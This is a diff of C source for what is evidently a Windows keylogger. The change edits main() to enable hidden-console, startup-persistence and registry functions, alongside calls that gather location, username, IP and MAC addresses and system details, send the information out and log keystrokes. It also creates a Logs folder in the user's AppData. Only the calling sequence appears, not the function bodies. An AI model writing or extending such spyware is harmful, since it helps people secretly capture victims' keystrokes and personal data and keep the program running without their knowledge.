@@ -480,21 +480,22 @@ location=abc;
 	
 
 	
-	main()
+	int main()
 	{   //Calling the functions
-//	hideconsole();
-	system("mkdir %USERPROFILE%\\AppData\\Roaming\\Logs");
-	turnofvoice();
-	getlocation();
-	getusername();
-	makefile();
-//	startup();
-	storexternalip();
-    storeipddress();
-	showsysteminfo();
-	gettime();
-	storemacaddress();
-//	registery();
-    sendinfo();
-    keylog();
-    }
+		hideconsole();
+		system("mkdir %USERPROFILE%\\AppData\\Roaming\\Logs");
+		turnofvoice();
+		getlocation();
+		getusername();
+		makefile();
+		startup();
+		storexternalip();
+		storeipddress();
+		showsysteminfo();
+		gettime();
+		storemacaddress();
+		registery();
+    		sendinfo();
+    		keylog();
+		return 0;
+    	}
